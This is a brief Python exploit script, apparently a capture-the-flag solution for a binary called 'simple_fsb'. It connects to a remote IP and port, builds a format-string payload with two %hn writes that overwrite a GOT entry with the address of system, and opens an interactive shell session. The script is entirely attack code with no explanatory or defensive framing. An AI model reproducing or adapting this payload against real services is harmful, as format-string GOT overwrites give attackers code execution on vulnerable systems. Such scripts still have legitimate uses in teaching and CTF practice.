from yeonnic import *

#p=process("./simple_fsb")
p=remote("211.110.229.114", 16051)

system=0x8048460
system1=0x8460
system2=0x804

print p.recv()

wait_proc()
p.sendline(p32(0x804a00c)+p32(0x804a00c+2)+"%"+str(system2-8)+"c%8$hn%"+str(system1-system2)+"c%7$hn")


p.interactive()
